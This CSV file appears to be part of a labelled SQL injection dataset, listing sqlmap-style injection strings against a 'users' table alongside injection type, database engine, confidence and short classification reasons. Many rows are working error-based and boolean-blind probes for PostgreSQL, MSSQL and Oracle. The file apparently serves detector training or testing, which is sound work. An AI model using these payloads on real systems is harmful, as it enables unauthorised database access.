id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
38305,"-2374 ) and username = ""-3424\' ) ) or username = ""-5217 where 3620 = 3620 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38306,-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38307,-1344 ) as gqgi where 2545 = 2545 and ( ( ( 6723 = 6723,unknown,generic,0.50,Insufficient data to classify payload type,1
38308,"select * from users WHERE username = ""1 ) where 6039 = 6039 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-1344 ) as gqgi where 2545 = 2545",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38309,"select * from users WHERE username = ""1\'+ ( select oljg where 2006 = 2006 and username = ""-4108\' ) and ( \'tqjx\' = \'tqjx"" or username = ""1\' ) where 1502 = 1502",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38310,"1 ) ) ) or username = ""-8828%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""1%\' ) ) ) and ( ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
38311,"select * from users WHERE username = ""1"" and username = ""1\' and username = ""1 ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38312,"select * from users WHERE username = ""-7430\' ) as xfah where 1596 = 1596 and \'qibr\' = \'qibr"" and username = ""-7720 ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38313,"select * from users WHERE username = ""1 ) ) ) and ( ( ( 5368 = 5368"" and username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
38314,"select * from users WHERE username = ""1\' or username = ""-9564 or username = ""-9263\' ) as qodg where 6798 = 6798",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38315,-8353\' ) ) ) and ( ( ( \'ptlz\' = \'ptlz,unknown,generic,0.50,Insufficient data to classify payload type,1
38316,"select * from users WHERE username = ""1\' ) ) as bswc where 1635 = 1635 and username = ""1%\' ) ) ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38317,"select * from users WHERE username = ""-1190\' and \'yxry\' like \'yxry"" and ( ( ( \'xopg\' = \'xopg"" or username = ""1\'+ ( select \'rejz\' where 1530 = 1530",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38318,"-1344 ) as gqgi where 2545 = 2545 and username = ""1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38319,"select * from users WHERE username = ""-8353\' ) ) ) and ( ( ( \'ptlz\' = \'ptlz"" and username = ""-5863"" and username = ""-7951\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38320,"select * from users WHERE username = ""-4322\' ) ) as magw where 1627 = 1627 and username = ""-2374 ) and ( 2576 = 2576"" and username = ""-3424\' ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38321,"select * from users WHERE username = ""1 or username = ""-4610\' ) ) or username = ""-5062 ) where 7457 = 7457",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38322,"select * from users WHERE username = ""-8069\' ) ) or username = ""1\' ) ) ) and ( ( ( \'ykjs\' like \'ykjs"" and username = ""1\'",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38323,"select * from users WHERE username = ""-5291\' ) ) or username = ""-7072\' ) and username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
38324,"select * from users WHERE username = ""1 ) as zmxb where 8424 = 8424 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-6179 ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38325,-2756\' where 6156 = 6156 and ( ( \'hdco\' = \'hdco,unknown,generic,0.50,Insufficient data to classify payload type,1
38326,1\'|| ( select \'rjun\' where 8868 = 8868 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\',error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38327,"1\' and username = ""-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38328,"-7199\' or username = ""1\' ) where 1502 = 1502 and ( \'mndw\' = \'mndw",unknown,generic,0.50,Insufficient data to classify payload type,1
38329,"-1190\' and username = ""-2783%\' ) ) and ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
38330,"select * from users WHERE username = ""1"" and username = ""-1190\' and \'yxry\' like \'yxry"" and username = ""-8860 )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38331,"select * from users WHERE username = ""1\' ) and ( \'bmhw\' like \'bmhw"" or username = ""1 or username = ""-4610\' ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38332,"-1549\' ) or username = ""-5291\' ) ) or username = ""-7072\' ) or username = ""1 ) ) ) and ( ( ( 9548 = 9548",unknown,generic,0.50,Insufficient data to classify payload type,1
38333,"select * from users WHERE username = ""1"" or username = ""-5062 ) where 7457 = 7457 or username = ""1"" and ""xyjg"" = ""xyjg"" or# username = ""-2783%\' ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38334,"1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 and username = ""-9505\' ) ) ) and ( ( ( \'qhdg\' = \'qhdg",unknown,generic,0.50,Insufficient data to classify payload type,1
38335,"select * from users WHERE username = ""-6203\' ) ) ) and ( ( ( \'luee\' = \'luee"" and username = ""-5062 ) where 7457 = 7457",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38336,"select * from users WHERE username = ""1 and username = ""-7242\' and \'kfff\' = \'kfff"" and username = ""1 ) as nbno where 9816 = 9816",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38337,"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""-2783%\' ) ) and ( ( \'%\' = \'"" or username = ""-7209\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38338,"select * from users WHERE username = ""-9742 ) where 8409 = 8409 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-7962\' ) ) as pgqz where 6058 = 6058 and username = ""-7430\' ) as xfah where 1596 = 1596",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38339,"select * from users WHERE username = ""-7710\' where 5658 = 5658 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-9564 and username = ""-6190\' ) where 2621 = 2621",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38340,"select * from users WHERE username = ""-9688%\' ) ) and ( ( \'%\' = \'"" or username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38341,"-7720 ) ) or username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'qbvz\' = \'qbvz",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38342,"select * from users WHERE username = ""1 ) or username = ""1%\' ) ) and ( ( \'%\' = \'"" and username = ""1"" and username = ""1\'+ ( select \'kicv\' where 1976 = 1976",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38343,"1\' or username = ""1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
